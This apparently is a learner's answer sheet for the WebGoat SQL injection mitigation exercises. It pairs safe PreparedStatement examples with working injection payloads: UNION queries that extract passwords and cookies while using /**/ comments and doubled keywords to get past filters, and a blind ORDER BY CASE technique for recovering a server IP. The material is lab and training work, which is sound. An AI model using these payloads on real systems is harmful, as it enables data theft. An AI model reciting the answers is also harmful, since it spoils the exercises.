# SQL Injection (Migration)

## 5 - Try It! Writing safe code

Answer:
Connection conn = DriverManager.`getConnection`(DBURL, DBUSER, DBPW);
```PreparedStatement statement``` = conn.`prepareStatement`("SELECT status FROM users WHERE name=`?` AND mail=`?`");
```statement.setString(1, name)```
```statement.setString(2, mail)```

## 6 - Try It! Writing safe code

Requirements:setS
- connect to a database
- perform a query on the database which is immune to SQL injection attacks
- your query needs to contain at least one string parameter

Answer:
```
try {
    String name = "name";
    Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
    PreparedStatement statement = conn.prepareStatement("SELECT name from users where name = ?");
    statement.setString(1, name);
    ResultSet rs = statement.executeQuery();  
    if ( rs.next() ) {
        
    }
} catch (Exception e) {
    System.out.println("Oops. Something went wrong!");
}

```

## 9 - Input Validation Alone is not enough!!
Reading - https://twitter.com/marcan42/status/1238004834806067200?s=21

Reference table
```
CREATE TABLE user_data (userid int not null,
                           first_name varchar(20),
                           last_name varchar(20),
                           cc_number varchar(30),
                           cc_type varchar(10),
                           cookie varchar(20),
                           login_count int);
```
```
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

Question:
Let’s repeat one of the previous assignments, the developer fixed the possible SQL injection with filtering, can you spot the weakness in this approach?


Answer: Need to bypass whitespace with /**/
Name = `'OR(1=1)UNION/**/select/**/userid,user_name,password,cookie,'1','2',3/**/from/**/user_system_data/**/where/**/'1'='1`

## 10 - Input validation alone is not enough!!
Answer: Use of spaces and/or SQL keywords are not allowed!
Hint: It is stripping SELECT and FROM.  Thus, we can craft the payload such that after stripping the keyword, it forms our keyword
e.g. SEL`SELECT`ECT = SELECT
Name:  `'OR(1=1)UNION/**/SELSELECTECT/**/userid,user_name,password,cookie,'1','2',3/**/FFROMROM/**/user_system_data/**/where/**/'1'='1`

## 12 - Injection through ORDER BY
In this assignment try to perform an SQL injection through the ORDER BY field. 
Try to find the ip address of the webgoat-prd server, guessing the complete ip address might take too long so we give you the last part: xxx.130.219.202

Solution
Input 1
```(CASE WHEN (select 1 from servers where ip like '%.130.219.202')=1 THEN id ELSE status END)```
Result 1 = order by id

Replace ip like to 
Input: ```1%.130.219.202```, Output: true
Input: ```11%.130.219.202```, Output: false
Input: ```10%.130.219.202```, Output: true
Input: ```104.130.219.202```, Output: true
Answer: `104.130.219.202`


